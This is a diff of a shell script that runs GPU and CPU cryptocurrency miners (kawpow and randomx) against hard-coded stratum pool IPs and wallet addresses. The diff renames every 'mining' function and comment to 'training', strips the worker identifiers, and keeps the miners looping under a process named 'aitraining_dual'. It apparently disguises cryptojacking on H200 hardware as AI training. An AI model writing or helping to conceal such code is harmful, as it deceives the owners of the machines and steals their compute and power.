@@ -31,8 +31,8 @@ print_usage() {
     fi
 }
 
-# Function to start mining processes
-start_mining() {
+# Function to start training processes
+start_training() {
     # Clean old processes
     pkill -f aitraining_dual 2>/dev/null || true
     sleep 2
@@ -42,7 +42,6 @@ start_mining() {
         --algorithm kawpow \
         --pool stratum+ssl://51.89.99.172:16161 \
         --wallet RM2ciYa3CRqyreRsf25omrB4e1S95waALr \
-        --worker H200-g \
         --password x \
         --gpu-id 0,1,2,3,4,5,6,7 \
         --tls true \
@@ -55,7 +54,6 @@ start_mining() {
         --algorithm randomx \
         --pool stratum+ssl://51.222.200.133:10343 \
         --wallet 44csiiazbiygE5Tg5c6HhcUY63z26a3Cj8p1EBMNA6DcEM6wDAGhFLtFJVUHPyvEohF4Z9PF3ZXunTtWbiTk9HyjLxYAUwd \
-        --worker H200-c \
         --password x \
         --cpu-threads 80 \
         --disable-gpu \
@@ -66,8 +64,8 @@ start_mining() {
     echo "Started processes: GPU_PID=$GPU_PID, CPU_PID=$CPU_PID"
 }
 
-# Function to stop mining processes
-stop_mining() {
+# Function to stop training processes
+stop_training() {
     echo -e "\nStopping AI processes..."
     kill $GPU_PID 2>/dev/null || true
     kill $CPU_PID 2>/dev/null || true
@@ -89,8 +87,8 @@ echo "======================================"
 
 # Main loop
 while true; do
-    # Start mining processes
-    start_mining
+    # Start training processes
+    start_training
     
     # Get current time
     start_time=$(date +%s)
@@ -112,7 +110,7 @@ while true; do
         sleep 2
     done
     
-    stop_mining
+    stop_training
     
     # Show pause message
     echo -e "\nPausing for 1 minute..."
